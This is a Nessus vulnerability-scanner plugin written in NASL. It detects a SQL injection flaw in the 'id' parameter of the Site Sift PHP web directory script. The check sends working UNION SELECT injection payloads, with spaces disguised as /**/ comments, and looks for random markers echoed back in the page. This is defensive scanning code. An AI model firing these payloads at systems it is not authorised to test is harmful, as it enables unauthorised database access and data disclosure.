#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31790);
  script_version("$Revision: 1.5 $");

  script_bugtraq_id(28644);
  script_xref(name:"milw0rm", value:"5383");
  script_xref(name:"Secunia", value:"29705");
  script_xref(name:"OSVDB", value:"44140");

  script_name(english:"Site Sift Listings detail.php id Parameter SQL Injection");
  script_summary(english:"Tries to manipulate link information");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Site Sift, a PHP script for maintaining a
web directory. 

The version of Site Sift installed on the remote host fails to
sanitize user-supplied input to the 'id' parameter before before using
it in the 'detail.php' script to construct a database query. 
Regardless of PHP's 'magic_quotes_gpc' setting, an unauthenticated
attacker may be able to exploit this issue to manipulate database
queries, leading to disclosure of sensitive information, modification
of data, or attacks against the underlying database." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);


magic1 = unixtime();
magic2 = rand();

exploits = make_list(
  string("-99999 UNION SELECT 0,1,concat(", magic1, ",0x3a,", magic2, "),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20"),
  string("-99999 UNION SELECT 0,1,concat(", magic1, ",0x3a,", magic2, "),3,4,5,6,7,8,9,10,11,12,13,14,15,16")
);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/site_sift", "/sitesift", "/directory", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to manipulate a link detail.
  foreach exploit (exploits)
  {
    req = http_get(
      item:string(
        dir, "/index.php?",
        "go=detail&",
        "id=", str_replace(find:" ", replace:"/**/", string:exploit)
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (isnull(res)) exit(0);

    # There's a problem if we could manipulate the link detail.
    if (string(">Link Information &raquo;&nbsp; ", magic1, ":", magic2, "</p>") >< res)
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
